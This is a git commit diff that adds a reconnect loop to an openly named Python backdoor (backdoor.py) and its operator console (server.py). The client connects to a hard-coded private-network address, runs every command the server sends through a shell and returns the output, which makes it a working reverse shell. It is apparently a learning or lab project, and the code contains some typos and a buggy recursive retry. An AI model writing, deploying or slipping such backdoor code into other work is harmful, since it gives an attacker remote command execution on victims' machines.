58484ee5979a672179bf7a1946a9686da3d92c81
Truc Tran <tracytrle@gmail.com>
2024-03-12 23:27:45 -0500

    initialization worked

--- backdoor.py
+++ backdoor.py
@@ -1,17 +1,25 @@
 import socket
+import subprocess
+import time
 
 REMOTE_HOST = '192.168.64.8'
 REMOTE_PORT = 8888
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client = socket.socket()
-print("[-] Connection Initiating...")
-clinet.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Connection initiated!")
+
+def thread_creation():
+  while True:
+    time.sleep(25)
+    try: 
+      client.connect((REMOTE_HOST, REMOTE_PORT))
+      start_command()
+      client.close()
+    except:
+      thread_creation()
 
 
-while True:
-  print("[-] Awaiting commands...")
+def start_command():
+  while True:
+    print("[-] Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
@@ -19,3 +27,13 @@ while True:
     output_error = op.stderr.read()
     print("[-] Sending response...")
     client.send(output + output_error)
+
+
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client = socket.socket()
+print("[-] Litening connection...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Connection initiated!")
+thread_creation()
+
--- server.py
+++ server.py
@@ -3,6 +3,18 @@ import socket
 HOST = '192.168.64.8'
 PORT = 8888
 
+
+
+def communication():
+  while True:
+      command = input('Enter Command : ')
+      command = command.encode()
+      client.send(command)
+      print('[+] Command sent')
+      output = client.recv(1024)
+      output = output.decode()
+      print(f"Output: {output}")
+
 server = socket.socket()
 server.bind((HOST, PORT))
 print('[+] Server Started')
@@ -10,13 +22,4 @@ print('[+] Listening For Client Connection ...')
 server.listen(1)
 client, client_addr = server.accept()
 print(f'[+] {client_addr} Client connected to the server')
-
-
-while True:
-    command = input('Enter Command : ')
-    command = command.encode()
-    client.send(command)
-    print('[+] Command sent')
-    output = client.recv(1024)
-    output = output.decode()
-    print(f"Output: {output}")
+communication()
